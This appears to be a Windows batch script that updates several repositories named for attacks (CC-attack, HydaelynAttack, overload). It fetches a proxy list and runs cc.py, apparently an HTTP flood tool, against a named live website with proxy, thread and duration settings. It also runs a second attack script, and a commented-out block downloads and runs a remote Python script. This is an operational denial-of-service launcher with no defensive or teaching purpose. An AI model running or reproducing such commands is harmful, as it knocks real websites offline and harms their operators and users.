
git config --global --add safe.directory F:/Nyaa-Automata
git config --global --add safe.directory F:/Nyaa-Automata/CC-attack
git config --global --add safe.directory F:/Nyaa-Automata/HydaelynAttack
git config --global --add safe.directory F:/Nyaa-Automata/overload

git pull

echo ""
echo "CC-attack"
cd CC-attack
git pull
curl https://jsd.cdn.zzko.cn/gh/TheSpeedX/PROXY-List@master/http.txt -o http.txt
F:\Python310\python.exe cc.py -url http://ffwebss.top/ -f http.txt -v 5 -s 30
cd ..

echo ""
echo "HydaelynAttack"
cd HydaelynAttack
git pull
F:\Python310\python.exe HydaelynAttack_p_once_noLog.py
cd ..
::
::echo ""
::echo "overload"
::cd overload
::git pull
::curl https://jsd.cdn.zzko.cn/gh/NyaaCaster/Nyaa-Automata@main/overload_p.py -o overload_p.py
::F:\Python310\python.exe overload_p.py
::cd ..
